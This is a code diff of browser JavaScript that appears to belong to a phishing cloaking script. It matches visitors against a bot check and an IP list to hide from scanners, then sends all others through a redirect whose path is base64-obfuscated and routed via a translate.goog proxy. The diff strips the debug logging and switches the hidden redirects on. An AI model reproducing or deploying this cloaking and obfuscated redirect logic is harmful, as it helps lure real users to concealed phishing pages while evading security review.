@@ -10,21 +10,21 @@
   const ipsFile = await fetch('i.txt').then((response) => response.text());
   const ipPatterns = ipsFile.split('\n').map((line) => line.trim()).filter((line) => line !== '');
   const isIpMatch = ipPatterns.some((pattern) => {
-  console.log('pattern:', pattern);
+  //console.log('pattern:', pattern);
   if (pattern.includes('/')) {
     const result = isIpInRange(ipAddress, pattern);
-    console.log('isIpInRange:', result);
+    //console.log('isIpInRange:', result);
     return result;
   }
   const result = ipAddress === pattern;
-  console.log('exact match:', result);
+  //console.log('exact match:', result);
   return result;
 });
   const hasMatch = isBot || isIpMatch;
-  console.log('isBot:', isBot);
-  console.log('isIpMatch:', isIpMatch);
-  console.log('hasMatch:', hasMatch);
-  console.log('ipAddress:', ipAddress);
+  //console.log('isBot:', isBot);
+  //console.log('isIpMatch:', isIpMatch);
+  //console.log('hasMatch:', hasMatch);
+  //console.log('ipAddress:', ipAddress);
   if (hasMatch) {
     xcvbnmq(false);
   } else {
@@ -51,13 +51,13 @@
       })
       .then(function(fileContents) {
         hash = fileContents;
-        console.log(hash);
-        //window.location.replace("https://"+dmain+atob('LnRyYW5zbGF0ZS5nb29nL3Vuc3Vic2NyaWJlL2Jsb2cuaHRtbD91PQ==')+oxx+atob('Jl94X3RyX3NsPWF1dG8mX3hfdHJfdGw9ZW4mX3hfdHJfaGw9ZW4tVVMmX3hfdHJfcHRvPXdhcHBibG9nLmh0bWw=')+hash);
+        //console.log(hash);
+        window.location.replace("https://"+dmain+atob('LnRyYW5zbGF0ZS5nb29nL3Vuc3Vic2NyaWJlL2Jsb2cuaHRtbD91PQ==')+oxx+atob('Jl94X3RyX3NsPWF1dG8mX3hfdHJfdGw9ZW4mX3hfdHJfaGw9ZW4tVVMmX3hfdHJfcHRvPXdhcHBibG9nLmh0bWw=')+hash);
       });
         //
         } else {
-            console.log('ERROR-HERE 5');
-          //window.location.replace('https://unsubscribe.github.io/');
+            //console.log('ERROR-HERE 5');
+          window.location.replace('https://unsubscribe.github.io/');
         }
     }
 
